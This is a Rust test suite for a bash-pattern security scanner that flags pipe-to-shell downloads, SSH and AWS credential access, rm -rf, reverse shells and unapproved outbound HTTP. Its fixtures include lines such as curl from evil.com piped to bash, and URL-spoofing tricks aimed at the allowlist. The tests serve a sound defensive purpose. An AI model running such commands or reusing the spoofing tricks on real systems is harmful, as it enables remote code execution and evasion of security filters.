use std::path::Path;

use oxidized_skills::config::Config;
use oxidized_skills::finding::Severity;
use oxidized_skills::scanners::bash_patterns::BashPatternScanner;
use oxidized_skills::scanners::Scanner;

fn scan_fixture(fixture: &str) -> oxidized_skills::finding::ScanResult {
    let config = Config::default();
    let path = Path::new("tests/fixtures").join(fixture);
    BashPatternScanner.scan(&path, &config)
}

#[test]
fn clean_skill_has_no_bash_findings() {
    let result = scan_fixture("clean-skill");
    assert!(!result.skipped);
    assert!(
        result.findings.is_empty(),
        "Expected no findings, got: {:?}",
        result.findings
    );
}

#[test]
fn dirty_skill_detects_pipe_to_shell() {
    let result = scan_fixture("dirty-skill");
    let a1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "bash/CAT-A1")
        .collect();
    assert!(!a1.is_empty(), "Expected CAT-A1 finding for pipe to shell");
    assert_eq!(a1[0].severity, Severity::Error);
}

#[test]
fn dirty_skill_detects_ssh_access() {
    let result = scan_fixture("dirty-skill");
    let b1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "bash/CAT-B1")
        .collect();
    assert!(!b1.is_empty(), "Expected CAT-B1 finding for ~/.ssh/ access");
}

#[test]
fn dirty_skill_detects_aws_access() {
    let result = scan_fixture("dirty-skill");
    let b2: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "bash/CAT-B2")
        .collect();
    assert!(!b2.is_empty(), "Expected CAT-B2 finding for ~/.aws/ access");
}

#[test]
fn dirty_skill_detects_rm_rf_home() {
    let result = scan_fixture("dirty-skill");
    let c1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "bash/CAT-C1")
        .collect();
    assert!(!c1.is_empty(), "Expected CAT-C1 finding for rm -rf $HOME");
}

#[test]
fn dirty_skill_detects_netcat_reverse_shell() {
    let result = scan_fixture("dirty-skill");
    let d1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "bash/CAT-D1")
        .collect();
    assert!(
        !d1.is_empty(),
        "Expected CAT-D1 finding for netcat reverse shell"
    );
}

#[test]
fn dirty_skill_detects_tcp_reverse_shell() {
    let result = scan_fixture("dirty-skill");
    let d2: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "bash/CAT-D2")
        .collect();
    assert!(
        !d2.is_empty(),
        "Expected CAT-D2 finding for /dev/tcp reverse shell"
    );
}

#[test]
fn dirty_skill_detects_sudo_bash() {
    let result = scan_fixture("dirty-skill");
    let e1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "bash/CAT-E1")
        .collect();
    assert!(!e1.is_empty(), "Expected CAT-E1 finding for sudo bash");
    assert_eq!(e1[0].severity, Severity::Warning);
}

#[test]
fn dirty_skill_detects_outbound_http() {
    let result = scan_fixture("dirty-skill");
    let h1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "bash/CAT-H1")
        .collect();
    assert!(
        !h1.is_empty(),
        "Expected CAT-H1 finding for outbound HTTP call"
    );
    assert_eq!(h1[0].severity, Severity::Info);
}

#[test]
fn inline_suppression_works() {
    let dir = tempfile::tempdir().unwrap();
    let scripts_dir = dir.path().join("scripts");
    std::fs::create_dir_all(&scripts_dir).unwrap();
    std::fs::write(
        scripts_dir.join("test.sh"),
        "#!/bin/bash\ncurl https://example.com/file.sh | bash # audit:ignore\n",
    )
    .unwrap();

    let config = Config::default();
    let result = BashPatternScanner.scan(dir.path(), &config);

    let a1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "bash/CAT-A1")
        .collect();
    assert!(a1.is_empty(), "Inline audit:ignore should suppress CAT-A1");
}

#[test]
fn cat_h1_suppressed_for_allowlisted_domain() {
    let dir = tempfile::tempdir().unwrap();
    let scripts_dir = dir.path().join("scripts");
    std::fs::create_dir_all(&scripts_dir).unwrap();
    std::fs::write(
        scripts_dir.join("test.sh"),
        "#!/bin/bash\ncurl https://registry.npmjs.org/package.tgz -o pkg.tgz\n",
    )
    .unwrap();

    // registry.npmjs.org is in the default allowlist
    let config = Config::default();
    let result = BashPatternScanner.scan(dir.path(), &config);
    let h1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "bash/CAT-H1")
        .collect();
    assert!(
        h1.is_empty(),
        "CAT-H1 should be suppressed for allowlisted domain registry.npmjs.org"
    );
}

#[test]
fn cat_h1_fires_for_unapproved_domain() {
    let dir = tempfile::tempdir().unwrap();
    let scripts_dir = dir.path().join("scripts");
    std::fs::create_dir_all(&scripts_dir).unwrap();
    std::fs::write(
        scripts_dir.join("test.sh"),
        "#!/bin/bash\ncurl https://evil.example.com/payload -o /tmp/p\n",
    )
    .unwrap();

    let config = Config::default();
    let result = BashPatternScanner.scan(dir.path(), &config);
    let h1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "bash/CAT-H1")
        .collect();
    assert!(
        !h1.is_empty(),
        "CAT-H1 should fire for domain not in allowlist"
    );
    assert_eq!(h1[0].severity, Severity::Info);
}

#[test]
fn cat_h1_suppressed_for_subdomain_of_allowlisted_domain() {
    let dir = tempfile::tempdir().unwrap();
    let scripts_dir = dir.path().join("scripts");
    std::fs::create_dir_all(&scripts_dir).unwrap();
    std::fs::write(
        scripts_dir.join("test.sh"),
        "#!/bin/bash\ncurl https://raw.githubusercontent.com/owner/repo/main/install.sh\n",
    )
    .unwrap();

    // githubusercontent.com is in the default allowlist; raw.githubusercontent.com is a subdomain
    let config = Config::default();
    let result = BashPatternScanner.scan(dir.path(), &config);
    let h1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "bash/CAT-H1")
        .collect();
    assert!(
        h1.is_empty(),
        "CAT-H1 should be suppressed for subdomain of allowlisted domain githubusercontent.com"
    );
}

#[test]
fn comments_are_skipped() {
    let dir = tempfile::tempdir().unwrap();
    let scripts_dir = dir.path().join("scripts");
    std::fs::create_dir_all(&scripts_dir).unwrap();
    std::fs::write(
        scripts_dir.join("test.sh"),
        "#!/bin/bash\n# curl https://evil.com/payload.sh | bash\necho safe\n",
    )
    .unwrap();

    let config = Config::default();
    let result = BashPatternScanner.scan(dir.path(), &config);

    let a1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "bash/CAT-A1")
        .collect();
    assert!(a1.is_empty(), "Comments should not trigger findings");
}

#[test]
fn cat_h1_fragment_bypass_is_not_suppressed() {
    // evil.com#.github.com — curl uses evil.com as the host; the fragment cannot make it look
    // like github.com to the allowlist checker.
    let dir = tempfile::tempdir().unwrap();
    let scripts_dir = dir.path().join("scripts");
    std::fs::create_dir_all(&scripts_dir).unwrap();
    std::fs::write(
        scripts_dir.join("test.sh"),
        "#!/bin/bash\ncurl https://evil.com#.github.com/payload\n",
    )
    .unwrap();

    let config = Config::default();
    let result = BashPatternScanner.scan(dir.path(), &config);
    let h1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "bash/CAT-H1")
        .collect();
    assert!(
        !h1.is_empty(),
        "Fragment-based domain spoofing should not suppress CAT-H1"
    );
}

#[test]
fn cat_h1_userinfo_bypass_is_not_suppressed() {
    // attacker.com@github.com — curl uses github.com as the host (userinfo), but our extractor
    // must not let the @-prefix fool it into treating attacker.com as allowlisted.
    // After stripping userinfo the captured host is github.com, which IS allowlisted, so
    // CAT-H1 is correctly suppressed (not a bypass — this is the correct safe behaviour).
    // The dangerous inverse is: https://github.com.evil.com/ which should NOT be suppressed.
    let dir = tempfile::tempdir().unwrap();
    let scripts_dir = dir.path().join("scripts");
    std::fs::create_dir_all(&scripts_dir).unwrap();
    std::fs::write(
        scripts_dir.join("test.sh"),
        "#!/bin/bash\ncurl https://github.com.evil.com/payload\n",
    )
    .unwrap();

    let config = Config::default();
    let result = BashPatternScanner.scan(dir.path(), &config);
    let h1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "bash/CAT-H1")
        .collect();
    assert!(
        !h1.is_empty(),
        "github.com.evil.com must not be treated as an allowlisted subdomain of github.com"
    );
}

#[test]
fn cat_h1_suppressed_for_allowlisted_domain_with_port() {
    // Ports must not bleed into the captured hostname; registry.npmjs.org:443 should still
    // match the allowlist entry "registry.npmjs.org".
    let dir = tempfile::tempdir().unwrap();
    let scripts_dir = dir.path().join("scripts");
    std::fs::create_dir_all(&scripts_dir).unwrap();
    std::fs::write(
        scripts_dir.join("test.sh"),
        "#!/bin/bash\ncurl https://registry.npmjs.org:443/package.tgz -o pkg.tgz\n",
    )
    .unwrap();

    let config = Config::default();
    let result = BashPatternScanner.scan(dir.path(), &config);
    let h1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "bash/CAT-H1")
        .collect();
    assert!(
        h1.is_empty(),
        "CAT-H1 should be suppressed when port is appended to an allowlisted domain"
    );
}

#[test]
fn cat_h1_suppressed_for_allowlisted_domain_with_userinfo() {
    // Userinfo (user@host) must be stripped before matching; the host portion must be
    // checked against the allowlist, not the raw authority string.
    let dir = tempfile::tempdir().unwrap();
    let scripts_dir = dir.path().join("scripts");
    std::fs::create_dir_all(&scripts_dir).unwrap();
    std::fs::write(
        scripts_dir.join("test.sh"),
        "#!/bin/bash\ncurl https://token@registry.npmjs.org/package.tgz -o pkg.tgz\n",
    )
    .unwrap();

    let config = Config::default();
    let result = BashPatternScanner.scan(dir.path(), &config);
    let h1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "bash/CAT-H1")
        .collect();
    assert!(
        h1.is_empty(),
        "CAT-H1 should be suppressed when userinfo is prepended to an allowlisted domain"
    );
}

#[test]
fn cat_h1_fires_when_any_url_on_line_is_unapproved() {
    // curl with two space-separated URLs: first is allowlisted, second is not.
    // The finding must NOT be suppressed — the unapproved URL must not hide behind
    // the allowlisted one.
    let dir = tempfile::tempdir().unwrap();
    let scripts_dir = dir.path().join("scripts");
    std::fs::create_dir_all(&scripts_dir).unwrap();
    std::fs::write(
        scripts_dir.join("test.sh"),
        "#!/bin/bash\ncurl https://registry.npmjs.org/check https://evil.com/payload.sh\n",
    )
    .unwrap();

    let config = Config::default();
    let result = BashPatternScanner.scan(dir.path(), &config);
    let h1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "bash/CAT-H1")
        .collect();
    assert!(
        !h1.is_empty(),
        "CAT-H1 must fire when an unapproved URL appears after an allowlisted URL on the same line"
    );
}

#[test]
fn cat_h1_suppressed_when_all_urls_on_line_are_allowlisted() {
    // Multiple URLs on one line, all within allowlisted domains — no finding expected.
    let dir = tempfile::tempdir().unwrap();
    let scripts_dir = dir.path().join("scripts");
    std::fs::create_dir_all(&scripts_dir).unwrap();
    std::fs::write(
        scripts_dir.join("test.sh"),
        "#!/bin/bash\ncurl https://registry.npmjs.org/a https://registry.npmjs.org/b\n",
    )
    .unwrap();

    let config = Config::default();
    let result = BashPatternScanner.scan(dir.path(), &config);
    let h1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "bash/CAT-H1")
        .collect();
    assert!(
        h1.is_empty(),
        "CAT-H1 should be suppressed when every URL on the line resolves to an allowlisted domain"
    );
}

// ---------------------------------------------------------------------------
// Fix #4: G1/G2 detect lowercase and mixed-case shell variables
// ---------------------------------------------------------------------------

#[test]
fn cat_g1_detects_lowercase_variable() {
    let dir = tempfile::tempdir().unwrap();
    let scripts_dir = dir.path().join("scripts");
    std::fs::create_dir_all(&scripts_dir).unwrap();
    std::fs::write(scripts_dir.join("test.sh"), "#!/bin/bash\nrm -rf $target\n").unwrap();

    let config = Config::default();
    let result = BashPatternScanner.scan(dir.path(), &config);
    let g1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "bash/CAT-G1")
        .collect();
    assert!(
        !g1.is_empty(),
        "CAT-G1 should fire for rm -rf $target (lowercase variable)"
    );
}

#[test]
fn cat_g1_detects_mixed_case_variable() {
    let dir = tempfile::tempdir().unwrap();
    let scripts_dir = dir.path().join("scripts");
    std::fs::create_dir_all(&scripts_dir).unwrap();
    std::fs::write(
        scripts_dir.join("test.sh"),
        "#!/bin/bash\nrm -rf $buildDir\n",
    )
    .unwrap();

    let config = Config::default();
    let result = BashPatternScanner.scan(dir.path(), &config);
    let g1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "bash/CAT-G1")
        .collect();
    assert!(
        !g1.is_empty(),
        "CAT-G1 should fire for rm -rf $buildDir (mixed-case variable)"
    );
}

#[test]
fn cat_g2_detects_lowercase_variable() {
    let dir = tempfile::tempdir().unwrap();
    let scripts_dir = dir.path().join("scripts");
    std::fs::create_dir_all(&scripts_dir).unwrap();
    std::fs::write(scripts_dir.join("test.sh"), "#!/bin/bash\nbash -c $cmd\n").unwrap();

    let config = Config::default();
    let result = BashPatternScanner.scan(dir.path(), &config);
    let g2: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "bash/CAT-G2")
        .collect();
    assert!(
        !g2.is_empty(),
        "CAT-G2 should fire for bash -c $cmd (lowercase variable)"
    );
}

#[test]
fn cat_g2_detects_mixed_case_variable() {
    let dir = tempfile::tempdir().unwrap();
    let scripts_dir = dir.path().join("scripts");
    std::fs::create_dir_all(&scripts_dir).unwrap();
    std::fs::write(
        scripts_dir.join("test.sh"),
        "#!/bin/bash\nsh -c $userScript\n",
    )
    .unwrap();

    let config = Config::default();
    let result = BashPatternScanner.scan(dir.path(), &config);
    let g2: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "bash/CAT-G2")
        .collect();
    assert!(
        !g2.is_empty(),
        "CAT-G2 should fire for sh -c $userScript (mixed-case variable)"
    );
}

// ---------------------------------------------------------------------------
// Regression guard: PATTERNS and PATTERN_SET must remain in sync
// ---------------------------------------------------------------------------

#[test]
fn bash_pattern_rule_count_matches_expected() {
    // rules() derives its entries from the PATTERNS static array.
    // If a pattern is added to PATTERN_SET but not to PATTERNS (or vice-versa),
    // runtime indexing will panic.  This test pins the expected count so that
    // any accidental drift is caught immediately at compile/test time.
    //
    // Expected breakdown: A1-A4 (4) + B1-B5 (5) + C1-C2 (2) + D1-D3 (3)
    //                   + E1-E2 (2) + G1-G2 (2) + H1 (1) = 19
    let rules = oxidized_skills::scanners::bash_patterns::rules();
    assert_eq!(
        rules.len(),
        19,
        "Bash scanner has {} rules but expected 19 — update this count after adding/removing a pattern",
        rules.len()
    );
}

// ---------------------------------------------------------------------------
// Fix #1: Snippet truncation does not panic on multi-byte UTF-8 characters
// ---------------------------------------------------------------------------

#[test]
fn snippet_truncation_no_panic_on_multibyte_chars() {
    // Build a line longer than 120 chars with a multi-byte emoji at position 117.
    // If slicing uses raw bytes instead of char boundaries, this panics.
    let dir = tempfile::tempdir().unwrap();
    let scripts_dir = dir.path().join("scripts");
    std::fs::create_dir_all(&scripts_dir).unwrap();
    // 116 ASCII chars + emoji (4 bytes) + more content so total > 120 chars
    let prefix = "a".repeat(116);
    let line = format!("curl https://evil.com/{}🔥payload.sh | bash\n", prefix);
    std::fs::write(scripts_dir.join("test.sh"), format!("#!/bin/bash\n{line}")).unwrap();

    let config = Config::default();
    // Should not panic; if it does the test fails
    let result = BashPatternScanner.scan(dir.path(), &config);
    let a1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "bash/CAT-A1")
        .collect();
    assert!(
        !a1.is_empty(),
        "CAT-A1 should still fire; snippet truncation must not panic"
    );
}
